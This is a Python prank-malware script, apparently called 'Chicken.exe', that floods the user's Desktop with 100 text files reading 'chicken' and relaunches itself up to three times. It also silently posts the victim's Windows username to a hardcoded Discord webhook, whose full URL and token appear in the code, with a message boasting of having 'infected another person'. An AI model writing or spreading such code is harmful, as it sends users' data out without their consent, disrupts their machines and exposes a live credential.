import os
import sys
import subprocess
import requests
import getpass
from pathlib import Path
import tkinter as tk
from tkinter import messagebox

WEBHOOK_URL = "https://discord.com/api/webhooks/1273817690053808228/YxJ9Sr8AnJTcVWJCk7X-lj_e7vppTZ7ck1GD8E-sfKOJFlVNW-woDZ8Bt3lK-DztHxxn"

def install_package(package_name):
    """Install the package using pip."""
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package_name])
    except subprocess.CalledProcessError as e:
        print(f"Failed to install {package_name}: {e}")
        sys.exit(1)

def check_and_install_requests():
    """Check if the 'requests' library is installed and install it if not."""
    try:
        import requests
    except ImportError:
        print("'requests' library is not installed. Installing...")
        install_package("requests")

def check_and_install_python():
    """Check if Python is installed and install it if not."""
    try:
        subprocess.check_call(["python", "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except subprocess.CalledProcessError:
        print("Python is not installed. Please install Python from the official website.")
        sys.exit(1)

def get_unique_folder_name(base_path, base_name):
    """Generate a unique folder name by adding a number suffix if necessary."""
    folder_name = base_name
    counter = 1
    
    # Generate unique folder name
    while (base_path / folder_name).exists():
        folder_name = f"{base_name}{counter}"
        counter += 1
    
    return folder_name

def create_folder_and_files(base_name):
    """Create a unique folder on the desktop, fill it with 100 .txt files, and then move those files to the desktop."""
    # Get the path to the user's desktop
    desktop_path = Path.home() / "Desktop"
    
    # Generate a unique folder name
    unique_folder_name = get_unique_folder_name(desktop_path, base_name)
    
    # Define the path for the new folder
    new_folder_path = desktop_path / unique_folder_name
    
    # Create the folder
    new_folder_path.mkdir()
    
    # Create 100 .txt files with the message 'chicken'
    for i in range(1, 101):
        file_path = new_folder_path / f"file{i}.txt"
        with open(file_path, "w") as file:
            file.write("chicken")
    
    # Move files to the desktop
    for file in new_folder_path.glob("*.txt"):
        file.rename(desktop_path / file.name)
    
    # Show status in the GUI
    status_message = f"Files moved to the desktop from '{unique_folder_name}'. The original folder remains."
    show_message("Status", status_message)
    
    # Send a message to the Discord webhook
    username = getpass.getuser()  # Get the Windows username
    message_content = f"Chicken.exe has infected another person yet againðŸ’€ - {username}"
    send_discord_message(message_content)
    
    # Manage the number of reruns
    counter_file = Path("run_counter.txt")
    if counter_file.exists():
        with open(counter_file, "r") as file:
            run_count = int(file.read().strip())
    else:
        run_count = 0
    
    # Debug information
    debug_message = f"Current run count: {run_count}"
    show_message("Debug", debug_message)
    
    # Increment run count and check if we need to rerun
    run_count += 1
    if run_count < 3:
        with open(counter_file, "w") as file:
            file.write(str(run_count))
        
        rerun_message = f"Rerunning the script... (run {run_count})"
        show_message("Status", rerun_message)
        
        python_executable = sys.executable
        script_path = sys.argv[0]
        os.execv(python_executable, [python_executable, script_path])
    else:
        exit_message = "Maximum rerun limit reached. Exiting."
        show_message("Status", exit_message)
        # Clean up: remove the counter file if it's no longer needed
        if counter_file.exists():
            counter_file.unlink()

def show_message(title, message):
    """Show a message box with the given title and message."""
    root = tk.Tk()
    root.withdraw()  # Hide the root window
    messagebox.showinfo(title, message)
    root.mainloop()

def send_discord_message(content):
    """Send a message to the Discord webhook."""
    data = {"content": content}
    try:
        response = requests.post(WEBHOOK_URL, json=data)
        response.raise_for_status()  # Raise an error for bad responses
        print(f"Message sent successfully. Status code: {response.status_code}")
    except requests.RequestException as e:
        print(f"Failed to send message to Discord: {e}")
        print(f"Response text: {e.response.text if e.response else 'No response text available'}")

if __name__ == "__main__":
    check_and_install_requests()  # Ensure 'requests' library is installed
    check_and_install_python()    # Ensure Python is installed
    base_name = "ChickenFolder"  # Base name for the folder
    create_folder_and_files(base_name)
